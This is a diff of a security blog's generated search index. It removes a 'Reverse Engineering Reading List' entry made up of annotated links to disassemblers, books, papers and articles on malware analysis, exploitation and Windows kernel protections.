+        <category>List</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>list</tag>
+        <tag>reverse</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>A list of IDA Plugins</title>
     <url>/2018/10/01/2018-09-31-idaplugins-list/</url>
     <content><![CDATA[<p><strong>From <a href="https://github.com/onethawt/" target="_blank" rel="noopener">onethawt</a></strong></p>
@@ -3909,118 +4048,6 @@ $ hexo s -g
         <tag>list</tag>
         <tag>reverse</tag>
         <tag>ida</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Reverse Engineering Reading List</title>
-    <url>/2018/10/01/2018-09-31-Reverse-Engineering-Reading-List/</url>
-    <content><![CDATA[<p><strong>From <a href="https://github.com/onethawt/" target="_blank" rel="noopener">onethawt</a></strong></p>
-<p>If any of the links are down and you can’t retrieve them on <a href="http://archive.org" target="_blank" rel="noopener">archive.org</a>, <a href="http://one.thawt.io/contact/" target="_blank" rel="noopener">contact me</a> and I can give you a copy of the document.</p>
-<h2 id="Software-amp-Libraries"><a href="#Software-amp-Libraries" class="headerlink" title="Software &amp; Libraries"></a>Software &amp; Libraries</h2><ul>
-<li><a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="noopener">IDA Pro</a>: The <strong>KING</strong> IDA is a Windows, Linux or Mac OS X hosted multi-processor disassembler and debugger that offers so many features it is hard to describe them all.</li>
-<li><a href="https://github.com/NationalSecurityAgency/ghidra" target="_blank" rel="noopener">Ghidra</a>: Ghidra is a software reverse engineering (SRE) framework created and maintained by the National Security Agency Research Directorate. This framework includes a suite of full-featured, high-end software analysis tools that enable users to analyze compiled code on a variety of platforms including Windows, Mac OS, and Linux. Capabilities include disassembly, assembly, decompilation, graphing, and scripting, along with hundreds of other features. Ghidra supports a wide variety of process instruction sets and executable formats and can be run in both user-interactive and automated modes. Users may also develop their own Ghidra plug-in components and/or scripts using Java or Python.</li>
-<li><a href="https://binary.ninja/" target="_blank" rel="noopener">Binary Ninja</a>: A reverse engineering platform. It focuses on a clean and easy to use interface with a powerful multithreaded analysis built on a custom IL to quickly adapt to a variety of architectures, platforms, and compilers.</li>
-<li><a href="http://www.capstone-engine.org/" target="_blank" rel="noopener">Capstone</a>: Capstone is a lightweight multi-platform, multi-architecture disassembly framework. Our target is to make Capstone the ultimate disassembly engine for binary analysis and reversing in the security community.</li>
-<li><a href="https://www.hopperapp.com/" target="_blank" rel="noopener">Hopper</a>: Hopper is a reverse engineering tool for OS X and Linux, that lets you disassemble, and decompile your 32/64bits Intel Mac, Linux, Windows and iOS executables! Based on capstone, scriptable.</li>
-<li><a href="https://github.com/Maratyszcza/PeachPy" target="_blank" rel="noopener">PeachPy</a>: Portable efficient assembly code-generator in higher-level python.</li>
-<li><a href="http://www.radare.org/" target="_blank" rel="noopener">Radare2</a>: Portable reversing framework for disassembly, debugging, forensics, etc. Based on capstone, scriptable.</li>
-<li><a href="http://x64dbg.com/" target="_blank" rel="noopener">x64dbg</a>: Open source x64/x32 Windows debugger. Heir to Olly.</li>
-<li><a href="https://github.com/cboin/re_lab" target="_blank" rel="noopener">re_lab</a>: A portable reverse engineering environment using docker.</li>
-</ul>
-<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><ul>
-<li><a href="https://github.com/rednaga/training/tree/master/DEFCON23" target="_blank" rel="noopener">Offensive &amp; Defensive Android Reverse Engineering</a></li>
-</ul>
-<h2 id="Assembly-Disassembly"><a href="#Assembly-Disassembly" class="headerlink" title="Assembly / Disassembly"></a>Assembly / Disassembly</h2><ul>
-<li><a href="http://blog.ptsecurity.com/2015/07/best-reverser-write-up-analyzing.html" target="_blank" rel="noopener">Analyzing Uncommon Firmware</a></li>
-<li><a href="https://drive.google.com/file/d/0B0l-Qo3D3sAoMEhkcFBFVzRiNEk/view" target="_blank" rel="noopener">ARM v7 Disassembling</a></li>
-<li><a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/wang-shuai" target="_blank" rel="noopener">UROBOROS - Reassembling Disassembling</a> -  a tool that can disassemble executables to the extent that the generated code can be assembled back to working binaries without manual effort.</li>
-</ul>
-<h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><ul>
-<li><a href="https://vimeo.com/6764570" target="_blank" rel="noopener">Reverse Engineering 101 Speaker Presentation</a></li>
-<li><a href="https://prezi.com/a5tm-lf0879-/reverse-engineering-101-nyupoly-2010/" target="_blank" rel="noopener">Reverse Engineering 101 - NYU: Poly 2010</a>: Intro to Reverse Engineering given at NYU:Poly on October 4th, 2010 by Aaron Portnoy and Peter Silberman. </li>
-<li><a href="https://prezi.com/e5a2tumdqocj/reverse-engineering-102-nyupoly-2010/" target="_blank" rel="noopener">Reverse Engineering 102 - NYU: Poly 2010</a>: Intro to Reverse Engineering (Day 2) given at NYU:Poly on October 11th, 2010 by Aaron Portnoy and Peter Silberman.</li>
-<li><a href="https://trailofbits.github.io/ctf/" target="_blank" rel="noopener">CTF Field Guide</a></li>
-</ul>
-<h3 id="Books"><a href="#Books" class="headerlink" title="Books"></a>Books</h3><ul>
-<li><a href="https://www.amazon.com/Modern-X86-Assembly-Language-Programming/dp/1484200659" target="_blank" rel="noopener">Modern X86 Assembly Language Programming: 32-bit, 64-bit, SSE, and AVX</a>: Fundamentals of x86 assembly language programming. It focuses on the aspects of the x86 instruction set that are most relevant to application software development.</li>
-<li><a href="https://www.amazon.com/Practical-Malware-Analysis-Hands-Dissecting/dp/1593272901" target="_blank" rel="noopener">Practical Malware Analysis</a>: Practical Malware Analysis will teach you the tools and techniques used by professional analysts. With this book as your guide, you’ll be able to safely analyze, debug, and disassemble any malicious software that comes your way.</li>
-<li><a href="https://www.amazon.com/Practical-Reverse-Engineering-Reversing-Obfuscation/dp/1118787315" target="_blank" rel="noopener">Practical Reverse Engineering</a>: The book covers x86, x64, and ARM (the first book to cover all three); Windows kernel-mode code rootkits and drivers; virtual machine protection techniques; and much more. Best of all, it offers a systematic approach to the material, with plenty of hands-on exercises and real-world examples.</li>
-<li><a href="https://www.amazon.com/Reversing-Secrets-Engineering-Eldad-Eilam/dp/0764574817" target="_blank" rel="noopener">Reversing: Secrets of Reverse Engineering</a>: Beginning with a basic primer on reverse engineering-including computer internals, operating systems, and assembly language-and then discussing the various applications of reverse engineering, this book provides readers with practical, in-depth techniques for software reverse engineering.</li>
-<li><a href="https://beginners.re/" target="_blank" rel="noopener">Reverse Engineering for Beginners</a>: Available in english and russian, this ebook is a good introduction for beginners. Numerous topics are touched : Oracle RDBMS, Itanium, copy-protection dongles, LD_PRELOAD, stack overflow, ELF, win32 PE file format, x86-64, critical sections, syscalls, TLS, position-independent code (PIC), profile-guided optimization, C++ STL, OpenMP, win32 SEH.</li>
-<li><a href="https://www.amazon.com/IDA-Pro-Book-Unofficial-Disassembler/dp/1593272898" target="_blank" rel="noopener">The IDA Pro Book: The Unofficial Guide to the World’s Most Popular Disassembler</a>: Hailed by the creator of IDA Pro as “profound, comprehensive, and accurate,” the second edition of The IDA Pro Book covers everything from the very first steps to advanced automation techniques.</li>
-</ul>
-<h2 id="Data-Structures"><a href="#Data-Structures" class="headerlink" title="Data Structures"></a>Data Structures</h2><ul>
-<li><a href="https://www.isoc.org/isoc/conferences/ndss/10/pdf/23.pdf" target="_blank" rel="noopener">Automatic Reverse Engineering of Data Structures from Binary Execution</a> [PDF]</li>
-<li><a href="http://ben.ransford.org/srg/papers/cozzie--digging.pdf" target="_blank" rel="noopener">Digging For Data Structures</a> [PDF]</li>
-<li><a href="http://www.isoc.org/isoc/conferences/ndss/11/pdf/5_1.pdf" target="_blank" rel="noopener">Howard: a dynamic excavator for reverse engineering data structures</a> [PDF]</li>
-<li><a href="http://www.cs.vu.nl/~herbertb/papers/mempick_wcre13.pdf" target="_blank" rel="noopener">MemPick: High-Level Data Structure Detection in C/C++ Binaries</a> [PDF]</li>
-<li><a href="https://reverse.put.as/wp-content/uploads/2011/06/D1T2-Mark-Dowd-Tarjei-Mandt-iOS6-Security.pdf" target="_blank" rel="noopener">TIE: Principled Reverse Engineering of Types in Binary Programs</a> [PDF]</li>
-</ul>
-<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><ul>
-<li><a href="http://www.crisalis-project.eu/sites/crisalis-project.eu/files/crisalis_deliverable-D5.3.pdf" target="_blank" rel="noopener">Automated Vulnerability Discovery Techniques</a> [PDF]</li>
-<li><a href="https://www.usenix.org/sites/default/files/sec15_supplement.pdf" target="_blank" rel="noopener">Dismantling Megamos Crypto: Wirelessly Lockpicking a Vehicle Immobilizer</a> [PDF]</li>
-<li><a href="http://software.imdea.org/~juanca/papers/sigpath_esorics14.pdf" target="_blank" rel="noopener">Memory Graph Approach for Program Data Introspection and Modification</a> [PDF]</li>
-<li><a href="http://illmatics.com/Remote%20Car%20Hacking.pdf" target="_blank" rel="noopener">Remote Exploitation of an Unaltered Passenger Vehicle</a> [PDF]</li>
-</ul>
-<h2 id="Instruction-Sets"><a href="#Instruction-Sets" class="headerlink" title="Instruction Sets"></a>Instruction Sets</h2><ul>
-<li><a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="noopener">Intel® 64 and IA-32 Architectures Software Developer Manuals</a>: These manuals describe the architecture and programming environment of the Intel® 64 and IA-32 architectures.</li>
-<li><a href="http://ref.x86asm.net/" target="_blank" rel="noopener">X86 Opcode and Instruction Reference</a>: This reference is intended to be precise opcode and instruction set reference (including x86-64). Its principal aim is exact definition of instruction parameters and attributes.</li>
-<li><a href="https://github.com/astocko/json-x86-64" target="_blank" rel="noopener">JSON x86-64 Intel instruction set</a>: The entire x86-64 Intel instruction set in a machine readable JSON format up to AVX-512.</li>
-<li><a href="http://www.felixcloutier.com/x86/" target="_blank" rel="noopener">X86-64 Reference</a>: Derived from the September 2014 version of the Intel® 64 and IA-32 Architectures Software Developer’s Manual, volumes 2A and 2B. <strong>Uses <a href="https://github.com/zneak/x86doc" target="_blank" rel="noopener">PDF mining</a> to generate the reference from official Intel docs.</strong></li>
-</ul>
-<h2 id="Mac-and-iOS"><a href="#Mac-and-iOS" class="headerlink" title="Mac and iOS"></a>Mac and iOS</h2><ul>
-<li><a href="https://github.com/iosre/iOSAppReverseEngineering" target="_blank" rel="noopener">iOS App Reverse Engineering</a>: iOS App Reverse Engineering is the world’s 1st book of very detailed iOS App reverse engineering skills</li>
-<li><a href="https://reverse.put.as/wp-content/uploads/2011/06/D1T2-Mark-Dowd-Tarjei-Mandt-iOS6-Security.pdf" target="_blank" rel="noopener">iOS Kernel Security</a> [PDF]</li>
-<li><a href="https://reverse.put.as/wp-content/uploads/2011/06/pod2g-jailbreak-techniques-wwjc-2012.pdf" target="_blank" rel="noopener">Jailbreaking Techniques</a> [PDF]</li>
-<li><a href="https://s3.amazonaws.com/s3.synack.com/T2_reversingIOSApps.pdf" target="_blank" rel="noopener">Reversing iOS Apps: A Practical Approach</a> [PDF]</li>
-</ul>
-<h2 id="Malware-Analysis"><a href="#Malware-Analysis" class="headerlink" title="Malware Analysis"></a>Malware Analysis</h2><ul>
-<li><a href="https://github.com/REhints/Publications/tree/master/Conferences/BH&#39;2015" target="_blank" rel="noopener">Distributing The Reconstruction Of High-Level Intermediate Representation For Large Scale Malware Analysis</a></li>
-</ul>
-<h3 id="Adware"><a href="#Adware" class="headerlink" title="Adware"></a>Adware</h3><ul>
-<li><a href="https://www.proteansec.com/whitepapers/Proteansec_Analysis_Disco_Savings.pdf" target="_blank" rel="noopener">Analysis of Disco Savings Adware</a> [PDF]</li>
-</ul>
-<h3 id="Trojans"><a href="#Trojans" class="headerlink" title="Trojans"></a>Trojans</h3><ul>
-<li><a href="https://www.proofpoint.com/us/threat-insight/post/You-Dirty-RAT" target="_blank" rel="noopener">You Dirty RAT: Analyzing an AlienSpy Payload</a></li>
-</ul>
-<h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><p><a href="http://www.di.fc.ul.pt/~nuno/PAPERS/WCRE11.pdf" target="_blank" rel="noopener">Reverse Engineering of Protocols from Network Traces</a> [PDF]</p>
-<h2 id="Obfuscation-and-Deobfuscation"><a href="#Obfuscation-and-Deobfuscation" class="headerlink" title="Obfuscation and Deobfuscation"></a>Obfuscation and Deobfuscation</h2><ul>
-<li><a href="http://www.cacs.louisiana.edu/~arun/papers/2010-pepm-lakhotia.pdf" target="_blank" rel="noopener">Context-Sensitive Analysis of Obfuscated x86 Executables</a> [PDF]</li>
-<li><a href="http://blog.mindedsecurity.com/2015/10/advanced-js-deobfuscation-via-ast-and.html" target="_blank" rel="noopener">Advanced JS Deobfuscation Via AST and Partial Evaluation</a></li>
-</ul>
-<h2 id="Research-Tools"><a href="#Research-Tools" class="headerlink" title="Research Tools"></a>Research Tools</h2><ul>
-<li><a href="https://www.cs.virginia.edu/~weimer/p/weimer-wcre2013-re-preprint.pdf" target="_blank" rel="noopener">Genetic Programming for Reverse Engineering</a></li>
-<li><a href="https://speakerdeck.com/snf/ir-transformation-synthesis-for-assembly-instructions" target="_blank" rel="noopener">IR Transformation Synthesis for Assembly Instructions</a></li>
-</ul>
-<h2 id="Unpacking"><a href="#Unpacking" class="headerlink" title="Unpacking"></a>Unpacking</h2><ul>
-<li><a href="https://www.blackhat.com/presentations/bh-usa-07/Yason/Whitepaper/bh-usa-07-yason-WP.pdf" target="_blank" rel="noopener">The Art of Unpacking</a> [PDF]</li>
-</ul>
-<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="Driver-Signature-Enforcement"><a href="#Driver-Signature-Enforcement" class="headerlink" title="Driver Signature Enforcement"></a>Driver Signature Enforcement</h3><ul>
-<li><a href="http://j00ru.vexillium.org/?p=1169" target="_blank" rel="noopener">Defeating Windows Driver Signature Enforcement #1: default drivers</a></li>
-<li><a href="http://j00ru.vexillium.org/?p=1393" target="_blank" rel="noopener">Defeating Windows Driver Signature Enforcement #2: CSRSS and thread desktops</a></li>
-<li><a href="http://j00ru.vexillium.org/?p=1455" target="_blank" rel="noopener">Defeating Windows Driver Signature Enforcement #3: The Ultimate Encounter</a></li>
-<li><a href="http://www.kernelmode.info/forum/viewtopic.php?t=3322&amp;f=11" target="_blank" rel="noopener">DSEFix - Defeating x64 Driver Signature Enforcement: Using exploitable signed drivers - VirtualBox driver</a></li>
-</ul>
-<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul>
-<li><a href="https://speakerdeck.com/snf/ir-transformation-synthesis-for-assembly-instructions" target="_blank" rel="noopener">HyperV and vmbus internals</a></li>
-</ul>
-<h3 id="Patch-Guard"><a href="#Patch-Guard" class="headerlink" title="Patch Guard"></a>Patch Guard</h3><ul>
-<li><a href="http://www.uninformed.org/?v=3&amp;a=3&amp;t=txt" target="_blank" rel="noopener">Bypassing PatchGuard on Windows x64</a></li>
-<li><a href="http://fyyre.ivory-tower.de/projects/bootloader.txt" target="_blank" rel="noopener">Disable PatchGuard Vista &amp; Windows 7</a></li>
-<li><a href="http://fyyre.ivory-tower.de/projects/bootloader_v2.txt" target="_blank" rel="noopener">Disable PatchGuard Windows 8 &amp; Windows 10</a></li>
-<li><a href="https://github.com/hfiref0x/UPGDSED" target="_blank" rel="noopener">Universal Patchguard and Driver Signature Enforcement Disable</a></li>
-</ul>
-<h3 id="Win32"><a href="#Win32" class="headerlink" title="Win32"></a>Win32</h3><ul>
-<li><a href="http://www.pinvoke.net/" target="_blank" rel="noopener">PInvoke.net</a>: PInvoke.net is primarily a wiki, allowing developers to find, edit and add PInvoke* signatures, user-defined types, and any other information related to calling Win32 and other unmanaged APIs from managed code (written in languages such as C# or VB.NET).</li>
-</ul>
-]]></content>
-      <categories>
-        <category>List</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>list</tag>
-        <tag>reverse</tag>
       </tags>
   </entry>
   <entry>
